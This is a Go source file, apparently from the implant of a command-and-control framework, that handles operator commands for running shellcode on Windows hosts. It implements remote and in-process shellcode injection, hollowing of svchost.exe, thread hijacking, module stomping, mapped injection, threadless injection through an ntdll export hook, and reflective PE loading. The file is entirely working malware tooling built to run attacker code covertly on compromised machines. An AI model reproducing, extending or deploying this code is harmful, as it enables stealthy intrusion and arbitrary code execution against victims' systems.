package main

import (
	"encoding/base64"
	"fmt"

	agentexec "github.com/mjopsec/taburtuaiC2/implant/exec"
	"github.com/mjopsec/taburtuaiC2/implant/inject"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

func handleInjectRemote(cmd *types.Command, result *types.CommandResult) {
	if cmd.ShellcodeB64 == "" {
		result.Error = "inject_remote requires shellcode_b64"
		result.ExitCode = 1
		return
	}
	if cmd.InjectPID == 0 {
		result.Error = "inject_remote requires inject_pid"
		result.ExitCode = 1
		return
	}
	sc, err := base64.StdEncoding.DecodeString(cmd.ShellcodeB64)
	if err != nil {
		result.Error = fmt.Sprintf("base64 decode: %v", err)
		result.ExitCode = 1
		return
	}
	method := cmd.InjectMethod
	if method == "" {
		method = "crt"
	}
	if err := inject.InjectShellcode(cmd.InjectPID, sc, method); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Injected %d bytes into PID %d via %s", len(sc), cmd.InjectPID, method)
}

func handleInjectSelf(cmd *types.Command, result *types.CommandResult) {
	if cmd.ShellcodeB64 == "" {
		result.Error = "inject_self requires shellcode_b64"
		result.ExitCode = 1
		return
	}
	sc, err := base64.StdEncoding.DecodeString(cmd.ShellcodeB64)
	if err != nil {
		result.Error = fmt.Sprintf("base64 decode: %v", err)
		result.ExitCode = 1
		return
	}
	if err := inject.ExecShellcodeSelf(sc); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Executed %d bytes in-memory", len(sc))
}

func handleHollow(cmd *types.Command, result *types.CommandResult) {
	exe := cmd.ProcessPath
	if exe == "" {
		exe = `C:\Windows\System32\svchost.exe`
	}
	sc, err := decodeShellcode(cmd.ShellcodeB64)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if err := inject.HollowProcess(exe, sc); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	technique := "shellcode RIP-redirect"
	if len(sc) >= 2 && sc[0] == 0x4D && sc[1] == 0x5A {
		technique = "PE hollow (NtUnmapViewOfSection)"
	}
	result.Output = fmt.Sprintf("[+] %s → %s (%d bytes)", technique, exe, len(sc))
}

func handleHijack(cmd *types.Command, result *types.CommandResult) {
	if cmd.InjectPID == 0 {
		result.Error = "inject_pid required"
		result.ExitCode = 1
		return
	}
	sc, err := decodeShellcode(cmd.ShellcodeB64)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if err := inject.HijackThread(cmd.InjectPID, sc); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Hijacked thread in PID %d (%d bytes)", cmd.InjectPID, len(sc))
}

func handleStomp(cmd *types.Command, result *types.CommandResult) {
	dll := cmd.SacrificialDLL
	if dll == "" {
		dll = "xpsservices.dll"
	}
	sc, err := decodeShellcode(cmd.ShellcodeB64)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if err := inject.StompModule(dll, sc); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Stomped %s .text section and queued execution (%d bytes)", dll, len(sc))
}

func handleMapInject(cmd *types.Command, result *types.CommandResult) {
	sc, err := decodeShellcode(cmd.ShellcodeB64)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if cmd.InjectPID == 0 {
		if err := inject.MapInjectLocal(sc); err != nil {
			result.Error = err.Error()
			result.ExitCode = 1
			return
		}
		result.Output = fmt.Sprintf("[+] Mapped+executed shellcode in local process (%d bytes)", len(sc))
	} else {
		if err := inject.MapInjectRemote(cmd.InjectPID, sc); err != nil {
			result.Error = err.Error()
			result.ExitCode = 1
			return
		}
		result.Output = fmt.Sprintf("[+] Cross-process mapped shellcode into PID %d (%d bytes)", cmd.InjectPID, len(sc))
	}
}

func handleThreadlessInject(cmd *types.Command, result *types.CommandResult) {
	if cmd.InjectPID == 0 {
		result.Error = "inject_pid required"
		result.ExitCode = 1
		return
	}
	if cmd.ShellcodeB64 == "" {
		result.Error = "shellcode_b64 required"
		result.ExitCode = 1
		return
	}
	shellcode, err := base64.StdEncoding.DecodeString(cmd.ShellcodeB64)
	if err != nil {
		result.Error = "shellcode_b64 decode: " + err.Error()
		result.ExitCode = 1
		return
	}
	dllName := cmd.SacrificialDLL
	exportName := cmd.InjectMethod
	if dllName == "" {
		dllName = "ntdll.dll"
	}
	if exportName == "" {
		exportName = "NtFlushInstructionCache"
	}
	if err := inject.ThreadlessInject(cmd.InjectPID, dllName, exportName, shellcode); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Threadless hook placed on %s!%s in PID %d — waiting for caller",
		dllName, exportName, cmd.InjectPID)
}

func handlePELoad(cmd *types.Command, result *types.CommandResult) {
	if cmd.ShellcodeB64 == "" && len(cmd.FileContent) == 0 {
		result.Error = "shellcode_b64 (base64 PE bytes) or file_content required"
		result.ExitCode = 1
		return
	}
	var peBytes []byte
	var err error
	if len(cmd.FileContent) > 0 {
		peBytes = cmd.FileContent
	} else {
		peBytes, err = base64.StdEncoding.DecodeString(cmd.ShellcodeB64)
		if err != nil {
			result.Error = "pe decode: " + err.Error()
			result.ExitCode = 1
			return
		}
	}
	base, err := agentexec.PeLoad(peBytes)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] PE loaded at 0x%X", base)
}

// decodeShellcode base64-decodes shellcode_b64 from a command payload.
func decodeShellcode(b64 string) ([]byte, error) {
	if b64 == "" {
		return nil, fmt.Errorf("shellcode_b64 required")
	}
	return base64.StdEncoding.DecodeString(b64)
}
